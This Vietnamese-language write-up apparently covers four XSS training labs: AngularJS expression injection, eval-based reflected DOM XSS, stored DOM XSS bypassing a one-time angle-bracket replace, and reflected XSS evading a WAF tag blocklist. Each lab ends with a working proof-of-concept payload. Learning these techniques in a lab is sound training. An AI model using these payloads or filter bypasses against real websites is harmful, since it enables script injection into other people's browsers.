### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- Kiểm tra phiên bản trang web.
    - AngularJS 1.7.7 -> Thử 1 chút research XSS vuln cho phiên bản này

    ![alt text](image-1.png)

- Prompt AI 1 chút để lấy payload. Thử lần lượt các payload trả về 

    ![alt text](image-2.png)

- Thành công alert ở payload thứ 2. Và thế là solve 

    ![alt text](image-3.png)

    ![alt text](image.png)

- PoC

    ```xml
    /?search=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D
    ```

### Lab: Reflected DOM XSS

- Lỗ hổng Reflected DOM-based XSS trong hàm eval()

    ![alt text](image-5.png)

    - Giờ tạo payload để nó chạy lệnh eval. Nó sẽ trông như này
    ```js
    var searchResultsObj = { "searchTerm": "\"-alert(1)}//", "results": [] };
    ```
    - Hay tương đương với
    ```js
    var searchResultsObj = {"searchTerm":""-alert(1)}//","results":[]};
    ```

- Thành công alert

    ![alt text](image-4.png)

- PoC

    ```
    /?search=%5C"-alert%281%29%7D%2F%2F
    ```

### Lab: Stored DOM XSS

- Hàm này chỉ thay 1 lần cặp dấu `<>` 

    ![alt text](image-6.png)

    - Thử tạo thêm 1 cặp `<>` để bypass nó. Trông sẽ như này
    ```js
    <><img src=1 onerror=alert(1)>
    ```
    - Sau khi replace, nó sẽ thành như này
    ```js
    &lt;><img src=1 onerror=alert(1)>
    ```

- Thành công alert 

    ![alt text](image-8.png)

- Solve

    ![alt text](image-7.png)

- Poc

    ```js
    <><img src=1 onerror=alert(1)>
    ```

### Lab: Reflected XSS into HTML context with most tags and attributes blocked

- Thử 1 số payload thì bị chặn bởi WAF

    ![alt text](image-9.png)

    - Tuy nhiên, `<>` lại không bị chặn -> WAF chỉ chặn các từ có trong blacklist như alert ...

    ![alt text](image-10.png)

- Thử brute force các thẻ bằng [tags.txt](tags.txt)

    - Hầu hết các thẻ đều bị WAF chặn, trừ `body`, `custom tags`

    ![alt text](image-11.png)

- Tiếp tục thử với các events hợp lệ -> `onresize` khả dụng cho payload để mở máy in `print()` 

    ![alt text](image-12.png)


- Gửi payload tới server

    ![alt text](image-13.png)

    - Solve

    ![alt text](image-14.png)

- PoC

    ```js
    <iframe src="https://0af300d50423837481e4b137001c0014.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
    ```


